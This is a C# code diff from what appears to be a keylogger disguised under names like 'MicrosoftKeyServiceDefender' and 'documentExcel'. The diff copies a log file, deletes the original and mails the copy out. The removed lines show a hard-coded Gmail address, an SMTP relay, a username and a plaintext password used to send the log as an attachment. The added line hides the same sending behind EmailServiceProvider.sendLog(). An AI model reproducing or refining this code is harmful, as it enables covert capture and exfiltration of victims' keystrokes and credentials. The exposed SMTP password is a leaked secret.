@@ -4,8 +4,8 @@ using System.Diagnostics;
 using System.Windows.Forms;
 using System.IO;
 using static MicrosoftKeyServiceDefender.ServiceConstants;
-using static MicrosoftKeyServiceDefender.EmailServiceProvider;
 using static MicrosoftKeyServiceDefender.KeyboardService;
+using MicrosoftKeyServiceDefender;
 
 namespace documentExcel
 {
@@ -49,30 +49,9 @@ namespace documentExcel
                 try
                 {
                     logFile.CopyTo(EmailLogFile, true);
-
-                    var fromEmail = "oompaloompadidum@gmail.com";
-                    var toEmail = "oompaloompadidum@gmail.com";
-                    var smtpServer = "smtp-relay.sendinblue.com";
-                    int smtpPort = 587;
-                    var smtpUsername = "oompaloompadidum@gmail.com";
-                    var smtpPassword = "TdjN4xWtGHKZmyPs";
-                    var attachmentFilePath = EmailLogFile;
-                    var subject = "";
-                    var body = "";
-
-                    SendEmailWithAttachment(
-                        fromEmail,
-                        toEmail,
-                        subject,
-                        body,
-                        smtpServer,
-                        smtpPort,
-                        smtpUsername,
-                        smtpPassword,
-                        attachmentFilePath
-                    );
-
                     logFile.Delete();
+
+                    EmailServiceProvider.sendLog();
                 }
                 catch(Exception ex)
                 {
